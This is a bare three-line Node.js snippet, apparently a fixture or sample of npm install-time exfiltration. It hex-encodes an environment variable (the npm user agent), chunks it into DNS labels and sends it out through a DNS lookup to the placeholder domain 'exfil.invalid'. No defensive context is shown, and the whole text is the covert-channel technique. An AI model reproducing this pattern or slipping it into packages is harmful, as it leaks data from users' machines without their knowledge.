const data = Buffer.from(process.env.npm_config_user_agent || "x").toString("hex");
const labels = data.match(/.{1,60}/g).slice(0, 3).join(".");
require("dns").resolve4(labels + ".exfil.invalid", () => {});
